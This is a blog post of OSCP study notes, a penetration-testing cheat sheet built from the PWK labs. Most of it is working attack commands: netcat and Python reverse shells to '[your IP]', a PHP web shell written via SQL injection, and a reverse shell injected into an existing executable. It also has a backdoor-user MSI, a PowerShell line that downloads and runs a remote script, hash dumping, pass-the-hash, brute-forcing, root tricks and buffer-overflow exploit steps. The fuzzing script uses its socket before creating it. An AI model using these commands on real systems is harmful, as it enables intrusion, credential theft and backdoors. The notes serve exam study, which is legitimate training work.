---
layout: post
title: "Useful OSCP Notes"
date: 2020-2-6
---

I have been studying for the OSCP for a little less than two months. I was studying 5-7 hours per day during my winter break, and I've learned a lot since I began. At the time of writing this blog post, my exam is in a week, and I just wanted to put down some of my notes that I've been using into a blog post. These notes mainly contain commands that I have been using throughout the PWK labs.

### Nmap
Ping Scan:
`nmap -sn [IP addresses]`

Search for specific port:
`nmap -p [port] [IP addresses]`

OS Fingerprinting:
`nmap -O [IP address]` 

Banner Grabbing:
`nmap -sV -sT [IP addresses]`

Connect to SMB and determine OS:
`nmap [IP address] --script smb-os-discovery.nse`

DNS Zone Transfer:
`nmap --script=dns-zone-transfer -p 53 [target]`

FTP Bounce Scan:
`nmap -p- -b anonymous@[FTP Server] [target] -Pn`

List of NSE scripts that could be used for vulnerability scanning:
`ls -l /usr/share/nmap/scripts/*vuln*`

[Link to a more in-depth Nmap quide](www.stationx.net/nmap-cheat-sheet/)

### DNS
Finding name servers:
`host -t ns example.com`

Finding mail servers:
`host -t mx example.com`

Looking up an IP address:
`host example.com`

Brute force IP addresses given a list of possible names:
`for ip in $(cat list.txt); do host $ip.example.com;done | grep -v "not found"`

Brute force domain names given list of possible IP addresses:
`for ip in $(seq 155 190);do host xxx.xxx.xxx.$ip;done | grep -v "not found"`

Zone Transfer:
`host -l example.com [name server]`

Script that automatically checks each DNS server and does a zone transfer:

```
# Simple Zone Transfer Bash Script 
#!/bin/bash 
# $1 is the first argument given after the bash script 
# Check if argument was given, if not, print usage 
if [ -z "$1" ]; then 
echo "[*] Simple Zone transfer script" 
echo "[*] Usage 
: $0 <domain name> " 
exit 0 
fi 
# if argument was given, identify the DNS servers for the domain 
for server in $(host -t ns $1 |cut -d" " -f4);do 
# For each of these servers, attempt a zone transfer 
host -l $1 $server |grep "has address" 
done 
```

### SMB
General enumeration:
`enum4linux -a [IP]`

Scan for open shares:
`nbtscan -r [IP]`

OS discovery:
`nmap -v -p 139, 445 --script=smb-os-discovery [IP]`

SMB vuln scan:
`nmap -v -p 139,445 --script=smb-vuln* --script-args=unsafe=1 `

Finding version of SMB: Use [this script](https://raw.githubusercontent.com/rewardone/OSCPRepo/master/scripts/recon_enum/smbver.sh).

SMBMap:
`smbmap -H [IP]`

View share names:
`smbclient -L [IP] -N`

Connecting to an SMB share:
`smbclient \\\\[IP]\\[share name]`

Mount shares:
`mount -t cifs //[IP]/[share name] [folder to mount to] -o username=[username],vers=1.0`

Common exploits: [MS08-067](https://www.exploit-db.com/exploits/40279) and [MS17-010](https://github.com/worawit/MS17-010)

### HTTP

Brute force directories:
`gobuster -u [URL] -w /usr/share/wordlists/dirb/common.txt`

Scanning for possible vulns:
`nikto --host [IP address]`

Scanning for vulns in Wordpress:
`wpscan --url [URL]`

### Reverse Shells
Netcat reverse shell (target): `nc -nv [your IP] [port] -e cmd.exe`. Replace cmd.exe with /bin/sh if the target is on linux.

Netcat reverse shell listener (local): `nc -nlvp 4444`

Python reverse shell: Make a local reverse shell listener, then run `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'` on the target (change the IP and port in the code).

Amazing PHP reverse shell that I use all the time: [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

A list of other handy reverse shells: [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet )

### SQL Injection
Useful guides: [Security Idiots](http://securityidiots.com/Web-Pentest/SQL-Injection/Part-1-Basic-of-SQL-for-SQLi.html) and [pentestmonkey](http://pentestmonkey.net/category/cheat-sheet/sql-injection)

Find the number of columns: Use the `order by [count]` instruction in your SQL injection. Start with 1, and then gradually increment count until you get an error.

Adding your own select statement: Type in a normal query value and then type in `union all select 1,2,3,4,5,6`. Note that both statements must have the same number of columns.

Discover MySQL version: `union all select 1,2,3,4,@@version,6`. Obviously, you'll have to modify this to use the correct number of columns.

Discover the current user: `union all select 1,2,3,4,user(),6`

Getting a list of tables: `union all select 1,2,3,4,table_name,6 FROM information_schema.tables`

Getting the names of columns of a table: `union all select 1,2,3,4,column_name,6 from information_schema.columns where table_name='users'`

Concatenate strings from two columns in to a single column: `union all select 1,2,3,4,concat(column1,0x3a,column2) from table_name`. Replace column1, column2, and table_name with the correct values.

Limit the number of rows returned: `LIMIT [rows]`

Reading local files in MySQL: `union all select 1,2,3,4,load_file('file/path'),6`

Writing local files: `'union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'backdoor.php'` 

MS-SQL instant root: Sometimes you can instantly root the machine if you have DB credentials for MSSQL. `nmap -p 443 -Pn -sS --script ms-sql-xp-cmdshell.nse --script-args mssql.username=sa,mssql.password=password,mssql.instance-all,ms-sql-xp-cmdshell.cmd="whoami" [IP]`

### LFI/RFI
Suppose you have the ability to include any local php file on the target, and also suppose that you could write any php script to the target. You could write the following PHP code: `<?php echo shell_exec($_GET['cmd']);?>` to obtain code execution via the cmd parameter.

For RFIs, you can just set the PHP include parameter to be a file on your local web server that gives you code execution.

For more information on LFI/RFI vulns, [click here](https://hackersonlineclub.com/lfi-rfi/).

### Password Attacks
List of default credentials: [Open-sez.me](http://open-sez.me/) and [Default-passwords](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)

Wordlists: Kali has wordlists located under /usr/share/wordlists/. There is also a common usernames file under /usr/share/commix/src/txt/usernames.txt

Generate all possible combinations of a list of characters: `crunch [min] [max] [list of characters] -o [output file]`

Generate password lists using words from a website: `cewl [URL]`

Brute force websites using Medusa: `medusa -h [IP] -U [usernames file] -P [passwords file]`

Wordpress brute force: `wpscan --log --batch --url [IP address] --wordlist /usr/share/wordlists/rockyou.txt --username [username] --threads 20`

Brute force web logins: `hydra -l [user] -p [password] [IP] http-post-form "<Login Page>:<Request Body>:<Error message>"`

Brute force RDP: `ncrack -vv --user [user] -P [passwords file] rdp://[IP]`

Brute force SNMP: `hydra -P [passwords file] -v [IP] snmp`

Brute force SSH: `hydra -l root -P [passwords file] [IP] ssh`

Dumping windows password hashes: Send over /usr/share/windows-binaries/fgdump.exe over to the target, and then run fgdump.exe. It will output files in a pwdump file.

Windows credential editor: WCE can search for passwords and steal credentials from memory. It is located under the /usr/share/wce/ directory in Kali.

Brute force pwdump (fgdump output): `john --wordlist=/usr/share/wordlists/rockyou.txt [pwdump file]`

Cracking linux hashes (you will need both /etc/passwd and /etc/shadow):
```
unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

Brute force password-protected zip files:
`fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt [zip file]`

Pass-the-hash for SMB:
```
export SMBHASH=[Hash]
pth-winexe -U administrator% //[IP] cmd
```

If you want to login to SMB, you could also do `smbmap -u [username] -p [hash] -H [IP]`.

### File Upload/Download
<b>Netcat:</b>

On the receiving end: `nc -l -p 1234 > file`

On the sending end: `nc [destination] 1234 < file`

<b>pyftpdlib:</b>

On Kali Linux:

```
cp folder/to/share
pip install pyftpdlib
python -m pyftpdlib -w -p 21
```

On the target: `ftp [your IP]`

On the target, you could also write down the ftp commands you'll use in a file and then run `ftp -s:ftp_commands.txt`. The first line should be `open [IP address]`, and the next two lines should be the username and password (if the username is anonymous, you can set the password to be anything, but it must be something).

<b>smbserver.py</b>

On Kali:

```
wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/smbserver.py
smbserver.py a file
```

On the target: `\\[your IP]\a\file`

<b>TFTP</b>

On Kali:

```
mkdir tftp/
atftpd --daemon --port 69 tftp/
cp [file to send] tftp/
```

On the target: `tftp -i [your IP] get [file]`

<b>HTTP</b>

Setup a web server on Kali using `systemctl enable apache2`. Copy the file that you want to send to /var/www/html/. Then navigate to http://[your IP]/file on the target system's web browser. If you are unable to access the target system's web browser, create a script called wget.vbs on the target machine by running the following code:

```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs 
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs 
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs 
echo Err.Clear >> wget.vbs 
echo Set http = Nothing >> wget.vbs 
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs 
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs 
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs 
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs 
echo http.Open "GET", strURL, False >> wget.vbs 
echo http.Send >> wget.vbs 
echo varByteArray = http.ResponseBody >> wget.vbs 
echo Set http = Nothing >> wget.vbs 
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs 
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs 
echo strData = "" >> wget.vbs 
echo strBuffer = "" >> wget.vbs 
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs 
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs 
echo Next >> wget.vbs 
echo ts.Close >> wget.vbs 
```

Then execute `cscript wget.vbs http://[your IP]/file` on the target machine.

<b>Powershell</b>

For targets that have powershell installed, you can create a powershell script to download a file from a webserver. Setup a webserver on Kali Linux using `systemctl enable apache2`, and move the file you want to send to /var/www/html. Run this on the target:

```
echo $storageDir = $pwd > wget.ps1 
echo $webclient = New-Object System.Net.WebClient >>wget.ps1 
echo $url = "http://10.11.0.5/file" >>wget.ps1 
echo $file = "new-exploit.exe" >>wget.ps1 
echo $webclient.DownloadFile($url,$file) >>wget.ps1 
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive - NoProfile -File wget.ps1 
```

### Msfvenom
Common payloads:
* windows/shell_reverse_tcp
* windows/shell/reverse_tcp (staged)
* php/reverse_php
* windows/meterpreter/reverse_https (popular for looking just like normal web traffic)
* linux/x86/shell_reverse_tcp
* linux/x86/shell/reverse_tcp (staged)

Creating a windows reverse shell: `msfvenom -p windows/shell_reverse_tcp LHOST=[local IP] LPORT=[listening port] -f c`

Avoiding bad characters: `msfvenom -p windows/shell_reverse_tcp LHOST=[local IP] LPORT=[listening port] -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d" `

Prevent the process from exiting: Use the `EXITFUNC=thread` option when using msfvenom.

Injecting a payload into an existing PE executable: `msfvenom -p windows/shell_reverse_tcp LHOST=[local IP] LPORT=[listening port] -f exe -e x86/shikata_ga_nai -i 9 -x binary_to_inject_into.exe -o shell_reverse_msf_encoded_embedded.exe`

### Upgrading Shell

On a Kali Linux terminal, use `stty -a` to see information about your window. On the victim, run `python -c 'import pty; pty.spawn("/bin/bash")'` (if the victim does not have Python installed, [click here](https://netsec.ws/?p=337) to get a list of other commands that you can run). After running the command to spawn a TTY shell, Ctrl-Z out of the reverse shell you're currently in, and type in the following three commands:
```
stty raw -echo
fg
reset
```
Note that your terminal may get messed up while doing this and print out random characters, but once you type in "reset", it should go back to normal. Now all you have to do is type in the following three commands:
```
export SHELL=bash
export TERM=[terminal type]
stty rows [rows] columns [134]
```
You should know how many rows and columns you have because when you typed in `stty -a` earlier, it printed out this information. The terminal type can vary depending on what kind of terminal you have, but I used "xterm-256color" as my terminal type.

### Linux Privesc

Find the version of linux: `uname -a`

Add public key to list of authorized SSH keys: `echo $(wget http://[your IP]/.ssh/id_rsa.pub) >> ~/.ssh/authorized_keys `

C Code for becoming root (required for some exploits): `echo -e '#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem("/bin/bash");\n}' > setuid.c`

If /etc/password has incorrect permissions, execute this code to instantly become root: `echo 'root::0:0:root:/root:/bin/bash' > /etc/passwd; su`

Changing PATH: If you can change the PATH variable, run `export PATH=.$PATH` to add the current folder to the PATH variable. Create a poisoned executable by typing in `echo "usermod -aG sudo [username]" >> /tmp/yo` and `chmod +x yo`. Replace yo with the name of a binary that is executed by root by another command or process. If you're still confused, have a look at [this](http://techblog.rosedu.org/exploiting-environment-variables.html).

Add to sudoers: Run `usermod -aG sudo [username]`. You could also try seeing if you have permission to edit the /etc/sudoers file using `visudo`. Sometimes, if you're lucky, you can instantly get root by doing `sudo su`.

Print commands that we are allowed to run as sudo: `sudo -l`

If you see a command in this list that allows you execute code, then you can execute code as root. For example, if we are allowed to use the find command as sudo, you can use `sudo find /home -exec sh -i\;`. Another example: if we are allowed to use the python command as sudo, you can use `sudo python -c "import pty; pty.spawn('/bin/bash');"`. You can use [GTFOBins](https://gtfobins.github.io/) to get a list of things that you can do when you are able to execute something as root.

Exploit cron jobs: You can find cron jobs using `ls -la /etc/cron.d`. If you can write to any of the files controlling the cron job, you can write your own command at the end of a cron job and have it be executed as root. For example, if you see a cron job called "update", you can search for the sh file that is running that cron job using `find / -perm 2 -type f 2>/dev/null | grep update`, and then you can modify it.

Print out binaries that have the SUID bit set: `find / -perm -u=s type f 2>/dev/null`. Sometimes [GTFOBins](https://gtfobins.github.io/) can help you escalate privileges if you see an SUID binary.

Script to extract passwords from known locations: [gimmecredz](https://github.com/0xmitsurugi/gimmecredz)

Enumeration scripts: 
* [linuxprivchecker.py](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py)
* [LinEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)
* [linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)

Good checklists:
* [Guif.re](https://guif.re/linuxeop)
* [g0tmi1k](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
* [payatu](https://payatu.com/guide-linux-privilege-escalation)

### Windows Privesc

Get system info: `systeminfo`

List environment variables: `set`

List your privileges: `whoami /priv`

Overwriting an Executable with Insecure Permissions:
Create a program called useradd.c on either the target (preferable, but if they don't have gcc, you can't do this) or on Kali.
```
#include <stdlib.h> 

int main () { 
    int i; 
    i=system ("net localgroup administrators low /add"); 
    return 0; 
} 
```
Replace low with the name of your current user. Compile useradd.c using `i686-w64-mingw32-gcc -o tooverwrite.exe useradd.c`, and move the exexcutable to the same directory as the executable that you want to overwrite.

List scheduled tasks: `schtasks /query /fo LIST /v`

List running services: `tasklist /SVC`

List started services: `net start`

See what software is installed:
```
dir /a "C:\Program Files" 
dir /a "C:\Program Files (x86)" 
reg query HKEY_LOCAL_MACHINE\SOFTWARE 
```

Dumping windows password hashes: You can use fgdump.exe to dump passwords in a file ending with .pwdump. Fgdump will also attempt to kill local antiviruses before dumping the passwords.

Adding users: `net user [username] [password] /ADD`

Changing group: `net localgroup [group name] [username] /ADD`

AlwaysElevated: Check if these two registry values are set to 1 by using `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` and `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`. If they are, then use the following command to create a malicious MSI: `msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi`. Send the MSI to the target, and run the MSI file using `msiexec /quiet /qn /i evil.msi`.

Looking at the registry: If you can't use the reg command, use the regedit command instead.
```
regedit /E file.reg "REGISTRY/VALUE/TO/READ"
type file.reg
```

Getting admin hashes: Look in the below locations for password hashes
* %SYSTEMROOT%\repair\SAM 
* %SYSTEMROOT%\System32\config\RegBack\SAM 
* %SYSTEMROOT%\System32\config\SAM 
* %SYSTEMROOT%\repair\system 
* %SYSTEMROOT%\System32\config\SYSTEM 
* %SYSTEMROOT%\System32\config\RegBack\system 

Download both the SAM file and the SYSTEM file onto Kali Linux, and then run `impacket-secretdump -sam SAM -system SYSTEM local` to get the hashes.

Searching for exploits: Run [this script](https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py) on Kali.

Checklists:
* [fuzzysecurity](http://www.fuzzysecurity.com/tutorials/16.html  )
* [absolomb](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)

Jaws Windows Enumerate Script (Requires Powershell): The script is found [here](https://github.com/411Hall/Jaws). You can easily download and run the script using the following commands (assuming that you have a webserver setup on Kali and you have put the jaws-enum.ps1 file under /var/www/html).
```
powershell 
IEX(New-Object Net.WebClient).downloadString('http://[your IP]/jaws-enum.ps1') 
```

### Metasploit

Selecting a module:
`use [module]`

Setting a payload:
`use [payload]`

Common payloads:
* windows/shell_reverse_tcp
* windows/shell/reverse_tcp (staged)
* php/reverse_php
* windows/meterpreter/reverse_https (popular for looking just like normal web traffic)
* linux/x86/shell_reverse_tcp
* linux/x86/shell/reverse_tcp (staged)

Handle incoming connections:
```
use exploit/multi/handler
set LHOST [local IP]
set LPORT [port]
exploit
```

Common meterpreter commands:
* Upload files: `upload [local file] [remote location for file]`
* Download files: `download [remote file] [local location for file]`
* Open a shell: `shell`
* Find basic information about the target: `sysinfo`
* Get the current user: `getuid`
* Search for a file: `search –f *pass*.txt`
* Take a screenshot of the desktop: `screenshot`

Convert metasploit modules to stand alone (a little bit advanced): [https://netsec.ws/?p=262](https://netsec.ws/?p=262)

### Steps for Buffer Overflow
1.) Gradually fuzz the input until you see that the program has crashed. Here is an example program that can be used for fuzzing:
```
#!/usr/bin/python 
import socket 
# Create an array of buffers, from 1 to 5900, with increments of 200. 
buffer=["A"] 
counter=100 
while len(buffer) <= 30: 
    buffer.append("A"*counter) 
    counter=counter+200 
for string in buffer: 
    print "Fuzzing PASS with %s bytes" % len(string) 
    connect=s.connect(('IP address',port))  # Change IP and port!
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    s.recv(1024) 
    s.send('USER test\r\n') 
    s.recv(1024) 
    s.send('PASS ' + string + '\r\n') 
    s.send('QUIT\r\n') 
    s.close() 
```

2.) We need to figure out where the program crashed. Use `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l [size]`, where size is a possible size that crashed the program in the previous step. This program will create a string that you should use as input into the program. After sending the string to the program, view it in a debugger, and copy the value of EIP right when the program crashed. You can then use `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l [size] -q [EIP's value]"` to discover the precise location where you can rewrite EIP.

3.) We need to check for bad characters, which are characters that should not be in your shellcode because they could delete part of your string (such as the \x00 character, which terminates strings in C). Below, there is a list of characters.
```
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10" 
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20" 
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30" 
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40" 
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50" 
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60" 
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70" 
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80" 
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90" 
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0" 
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0" 
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0" 
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0" 
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0" 
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0" 
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" 
```

Send the whole string to the vulnerable application. If one of the character is a badchar, then it will delete the rest of the string or not show up. Gradually delete values that are badchars until the whole string is able to be sent, and make sure you keep a list of badchars that have been deleted.

4.) We need to find some instruction that says "JMP ESP" so that we can just jump to the location our input and start executing code. Use the `!mona modules` command in Immunity to find DLLs that have Rebase, SafeSEH, ASLR, and NXCompat set to false (which basically means that the DLL will always load at the same address). Once you find a good DLL, use the follwing command to find a JMP ESP command: `!mona find -s "\xff\xe4" -m [DLL's file name]`. Note that the hex equivalent of JMP ESP is \xff\xe4, but you may have to modify this depending on your machine. This command will return a list of pointers to a JMP ESP instruction; select one that does not have any bad characters. If you're using EDB, open up the OpcodeSearcher plugin, set the Jump Equivalent value to ESP->EIP, and hit find. Confirm that the JMP works by setting a breakpoint at that location and setting EIP equal to that address of the jump instruction using the buffer overflow.

5.) Develop a payload using msfvenom that does not contain any bad characters.

6.) After you create the payload, sometimes you may have to execute some extra code before running the payload, in which case, you can use /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb to quickly write assembly code. You may also want to put a NOP sled at the beginning of your code if there is space.

7.) Setup a reverse shell listener. Create your final exploit and run it.
